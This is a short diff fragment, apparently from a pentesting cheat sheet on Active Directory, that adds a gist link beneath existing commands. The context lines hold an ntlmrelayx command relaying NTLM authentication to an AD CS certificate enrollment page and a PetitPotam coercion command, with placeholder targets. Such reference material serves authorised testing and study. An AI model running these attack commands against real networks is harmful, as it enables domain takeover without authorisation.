@@ -674,4 +674,7 @@ impacket-ntlmrelayx -t http://<IpADCSServer>/certsrv/certfnsh.asp -smb2support -
 ```
 python3 PetitPotam.py -u <user> -hashes <:hashNT> -d <domain> -dc-ip <ip> <ipLISTENER> <ipTARGET>
 ```
+
+https://gist.github.com/Flangvik/15c3007dcd57b742d4ee99502440b250
+
   
